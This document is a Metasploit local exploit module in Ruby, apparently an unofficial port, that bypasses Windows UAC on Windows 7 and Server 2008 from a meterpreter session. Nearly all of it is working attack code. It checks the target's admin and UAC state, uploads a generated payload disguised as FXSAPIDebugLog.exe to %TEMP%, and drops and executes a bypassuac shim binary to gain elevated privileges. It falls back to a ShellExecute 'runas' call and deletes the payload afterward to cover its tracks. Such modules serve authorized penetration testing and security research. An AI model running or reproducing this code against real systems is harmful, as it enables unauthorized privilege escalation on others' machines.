##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Post::File
  include Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Escalate UAC Protection Bypass',
      'Description'   => %q{
        This module will bypass Windows UAC.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'tomsmaily', # Port to shim exploit
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [
          'URL', 'http://127.0.0.1',
          'URL', '127.0.0.1'
        ]
      ],
      'DisclosureDate'=> "Dec 31 2010"
    ))

  end

  def bypassuac_path
    # path to the bypassuac binary
    path = ::File.join(Msf::Config.data_directory, "post")

    # decide, x86 or x64
    sysarch = sysinfo["Architecture"]
    if sysarch =~ /x64/i
	
	  print_status("Target Architecture: #{target_arch.first}")
      unless(target_arch.first =~ /64/i)
		print_error("Target is not a x64 System! Target Architecture: #{target_arch.first}")
      end

	  print_status("Payload Architecture: #{payload_instance.arch.first}")
      unless(payload_instance.arch.first =~ /64/i)
        print_error("Payload instance is not x64!")
      end	  
	
      unless(target_arch.first =~ /64/i) and (payload_instance.arch.first =~ /64/i)
         fail_with(
             Exploit::Failure::BadConfig,
             "x86 Target Selected for x64 System"
         )
		#print_error("BadConfig! x86 Target Selected for x64 System. Payload instance is not x64 and may crash!!!")
      end

      if sysarch =~ /WOW64/i
        return ::File.join(path, "bypassuac-shim-x86.exe")
      else
        return ::File.join(path, "bypassuac-shim-x64.exe")
      end
    else
      if (target_arch.first =~ /64/i) or (payload_instance.arch.first =~ /64/i)
        fail_with(
            Exploit::Failure::BadConfig,
            "x64 Target Selected for x86 System"
        )
		#print_error("BadConfig! x64 Target Selected for x86 System. Payload instance is not x86 and will crash!!!")
      end

      ::File.join(path, "bypassuac-shim-x86.exe") 
    end
  end

  def check_permissions!
    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Exploit::Failure::NoAccess, "Not in admins group, cannot escalate with this module")
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Exploit::Failure::NoAccess, "Cannot BypassUAC from Low Integrity Level")
    end
  end



  def exploit
    validate_environment!

    case get_uac_level
      when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP, UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP, UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
        fail_with(Exploit::Failure::NotVulnerable,
                  "UAC is set to 'Always Notify'\r\nThis module does not bypass this setting, exiting..."
        )
      when UAC_DEFAULT
        print_good "UAC is set to Default"
        print_good "BypassUAC can bypass this setting, continuing..."
      when UAC_NO_PROMPT
        print_warning "UAC set to DoNotPrompt - using ShellExecute 'runas' method instead"
        runas_method
        return
    end

    check_permissions!

    @temp_path = expand_path('%TEMP%').strip

    upload_payload!

    initiate_bypassuac(bypassuac_path)

    # delete the uac bypass payload
    vprint_status("Cleaning up payload file...")
    file_rm(payload_filepath)
  end

  def payload_filepath
    "#{@temp_path}/FXSAPIDebugLog.exe"
  end

  def runas_method
    payload = generate_payload_exe
    payload_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
    tmpdir = expand_path("%TEMP%")
    tempexe = tmpdir + "/" + payload_filename
    write_file(tempexe, payload)
    print_status("Uploading payload: #{tempexe}")
    session.railgun.shell32.ShellExecuteA(nil,"runas",tempexe,nil,nil,5)
    print_status("Payload executed!")
  end

  def initiate_bypassuac(bypassuac_path)
	print_status("Initiating UAC bypass!")
    begin
		bypassuac_filename = Rex::Text.rand_text_alpha((rand(8)+6)) + ".exe"
		tmpdir = expand_path("%TEMP%")
		tempexe = tmpdir + "/" + bypassuac_filename
		bypassuac = IO.binread(bypassuac_path)
		write_file(tempexe, bypassuac)
		print_status("Uploading bypassuac: #{tempexe}")
		pid = cmd_exec_get_pid("#{tempexe}")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to execute bypassuac!")
      vprint_error(e.to_s)
    end
  end

  def upload_payload!
    payload = generate_payload_exe
    print_status("Uploading the Payload to remote location... #{payload_filepath}")
    begin
      vprint_status("Payload #{payload.length} bytes long being uploaded..")
      write_file(payload_filepath, payload)
	  #upload_file("#{payload_filepath}", payload)
	  #file_local_write(payload_filepath, payload)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(
          Exploit::Exception::Unknown,
          "Error uploading file #{payload_filepath}: #{e.class} #{e}"
      )
    end
  end

  def validate_environment!
    fail_with(Exploit::Failure::None, 'Already in elevated state') if is_admin? or is_system?

    winver = sysinfo["OS"]

    unless winver =~ /Windows 2008|Windows [7]/
      fail_with(Exploit::Failure::NotVulnerable, "#{winver} is not vulnerable.")
    end

    if is_uac_enabled?
      print_status "UAC is Enabled, checking level..."
    else
      if is_in_admin_group?
        fail_with(Exploit::Failure::Unknown, "UAC is disabled and we are in the admin group so something has gone wrong...")
      else
        fail_with(Exploit::Failure::NoAccess, "Not in admins group, cannot escalate with this module")
      end
    end
  end

end

